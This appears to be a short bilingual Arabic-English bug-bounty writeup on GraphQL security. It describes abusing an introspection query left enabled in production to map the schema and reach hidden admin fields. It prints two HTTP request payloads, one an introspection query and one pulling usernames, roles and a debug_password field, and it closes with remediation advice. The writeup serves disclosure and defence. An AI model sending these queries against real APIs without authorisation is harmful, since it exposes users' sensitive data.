اختراق وتخطي حماية استعلامات GraphQL

GraphQL Security Attacks: Introspection and Query Injection

MEDIUM Bounty: $1,200

Overview / نظرة عامة

AR

واجهات GraphQL تتيح للمستخدم طلب الحقول التي يحتاجها بدقة. لكن إذا تم تفعيل ميزة الاستبطان (Introspection Query) في الإنتاج دون قيود، فبإمكان المهاجم تجميع المخطط الكامل واستغلال حقول مخفية للوصول لبيانات حساسة.

EN

GraphQL exposes API endpoints with client-controlled query depth. This writeup documents how leaving Introspection enabled in production allowed full database schema discovery, revealing hidden admin queries.

Exploitation Steps / خطوات الاستغلال

  1. إرسال استعلام الاستبطان (Introspection Query) للحصول على الهيكل الكامل للمخطط والأنواع المتاحة.
  2. البحث في المخطط المستخرج عن كائنات حساسة مثل users أو system_logs.
  3. اكتشاف حقل مخفي باسم debug_mode يسمح بتمرير استعلامات SQL بشكل غير مباشر.
  4. صياغة استعلام مخصص لسحب كافة بيانات المسؤولين وقراءتها بالكامل.

Exploit Payloads / الحمولات المستخدمة

Introspection Query / استعلام الاستبطان 
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{ __schema { types { name fields { name } } } }"}
Query Injection / استعلام حقن الحقول الحساسة 
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "query { users { username role debug_password } }"}

Remediation / التخفيف والحماية

AR

قم بتعطيل ميزة الاستبطان (Introspection Query) في خوادم الإنتاج، واحرص على التحقق من الصلاحيات لكل حقل في المخطط بشكل مستقل.

EN

Disable GraphQL Introspection in production environments, implement query depth and complexity limits, and enforce authorization checks on all query resolvers.
